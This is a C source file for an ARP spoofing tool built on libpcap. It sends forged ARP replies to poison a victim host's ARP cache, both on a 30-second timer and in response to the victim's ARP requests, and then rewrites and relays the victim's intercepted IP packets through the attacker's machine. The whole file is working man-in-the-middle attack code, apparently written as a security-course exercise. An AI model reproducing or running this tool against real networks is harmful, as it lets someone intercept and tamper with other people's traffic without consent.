#include <stdio.h>
#include <unistd.h>
#include <memory.h>
#include <pcap.h>
#include <time.h>
#include "module.h"
#define PERIOD 30 // seconds

void usage() {
  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
  printf("sample: ex : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
  if (argc%2 != 0) {
    usage();
    return -1;
  }
  const int SESSION_NUM = (argc - 2)/ 2;

  char * dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];

  pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  uint8_t sender_ip[SESSION_NUM][IP_ADDR_LEN], target_ip[SESSION_NUM][IP_ADDR_LEN], attacker_ip[SESSION_NUM][IP_ADDR_LEN];
  uint8_t attacker_mac[SESSION_NUM][ETHER_ADDR_LEN], sender_mac[SESSION_NUM][ETHER_ADDR_LEN], target_mac[SESSION_NUM][ETHER_ADDR_LEN];
  char attacker_ip_ori[SESSION_NUM][16];
  bool atk_ok[SESSION_NUM], sdr_ok[SESSION_NUM], trg_ok[SESSION_NUM];
  bool active[SESSION_NUM];

  for(int i = 0; i < SESSION_NUM; i++) {
    parseIP(sender_ip[i], argv[2 + 2 * i]);
    parseIP(target_ip[i], argv[3 + 2 * i]);
    printIPAddress("Sender ip", sender_ip[i]);
    printIPAddress("Target ip", target_ip[i]);

    getAttackerIPAddress(attacker_ip_ori[i], dev);
    parseIP(attacker_ip[i], attacker_ip_ori[i]);
    printIPAddress("Attacker ip", attacker_ip[i]);

    atk_ok[i] = getAttackerMacAddress(attacker_mac[i], dev);
    printMacAddress("Attacker Mac Address", atk_ok[i] ? attacker_mac[i] : NULL);

    sdr_ok[i] = getMacAddress(handle, sender_mac[i], attacker_mac[i], attacker_ip[i], sender_ip[i]);
    printMacAddress("Sender Mac Address", sdr_ok[i] ? sender_mac[i] : NULL);

    trg_ok[i] = getMacAddress(handle, target_mac[i], attacker_mac[i], attacker_ip[i], target_ip[i]);
    printMacAddress("Target Mac Address", trg_ok[i] ? target_mac[i] : NULL);
    
    printf("\n\n");
    if(atk_ok[i] && sdr_ok[i] && trg_ok[i]) active[i] = true;
  }
  
  time_t start = time(NULL);
  while(true) {
    time_t cur = time(NULL);
    if(cur - start >= PERIOD) {
      for(int i = 0; i < SESSION_NUM; i++) {
        if(!active[i]) continue;
        sendArpPacket(handle, attacker_mac[i], sender_mac[i], target_ip[i], sender_ip[i], 2);
      }
      start = cur;
    }

    struct pcap_pkthdr * header;
    const u_char * packet;

    int res = pcap_next_ex(handle, &header, &packet);
    if(res == 0) continue;
    if(res < 0) break;

    struct ether_header * ether_pkt = (struct ether_header *)packet;
    if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_ARP) { // send infection packet
      struct arp_packet * arp_pkt = (struct arp_packet *)packet;

      for(int i = 0; i< SESSION_NUM; i++) {
        if(!active[i]) continue;
        if(cmpMacAddress(arp_pkt -> arp_hdr.arp_sha, sender_mac[i]) && cmpIPAddress(arp_pkt -> arp_hdr.arp_tpa, target_ip[i])) {
            sendArpPacket(handle, attacker_mac[i], sender_mac[i], target_ip[i], sender_ip[i], 2);
        }
      }
    }

    else if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_IP) { // send relay packet
      struct ip_packet * ip_pkt = (struct ip_packet *)packet;
      u_char * send_packet = (u_char *)malloc(header -> caplen);

      for(int i = 0; i< SESSION_NUM; i++) {
        if(!active[i]) continue;

        uint8_t packet_src_ip[4], packet_dst_ip[4];
        changeIP(packet_src_ip, &ip_pkt -> ip_hdr.ip_src.s_addr);
        changeIP(packet_dst_ip, &ip_pkt -> ip_hdr.ip_dst.s_addr);
        if(cmpMacAddress(ip_pkt -> eth_hdr.ether_shost, sender_mac[i]) && cmpMacAddress(ip_pkt -> eth_hdr.ether_dhost, attacker_mac[i]) && cmpIPAddress(packet_src_ip, sender_ip[i])) {
          printf("\n[+] Send Relay Packet!\n");
          printMacAddress("  Old Src MAC", ip_pkt -> eth_hdr.ether_shost);
          printMacAddress("  Old Dst MAC", ip_pkt -> eth_hdr.ether_dhost);
          memcpy(ip_pkt -> eth_hdr.ether_shost, attacker_mac[i], ETHER_ADDR_LEN);
          memcpy(ip_pkt -> eth_hdr.ether_dhost, target_mac[i], ETHER_ADDR_LEN);
          printMacAddress("  New Src MAC", ip_pkt -> eth_hdr.ether_shost);
          printMacAddress("  New Dst MAC", ip_pkt -> eth_hdr.ether_dhost);

          memcpy(send_packet, packet, header -> caplen);
          memcpy(send_packet, ip_pkt, sizeof(struct arp_packet));

          printIPAddress("  Source IP", packet_src_ip);
          printIPAddress("  Target IP", packet_dst_ip);
          pcap_sendpacket(handle, send_packet, header -> caplen);
        }
      }
      free(send_packet);
    }
  }

  pcap_close(handle);

  return 0;
}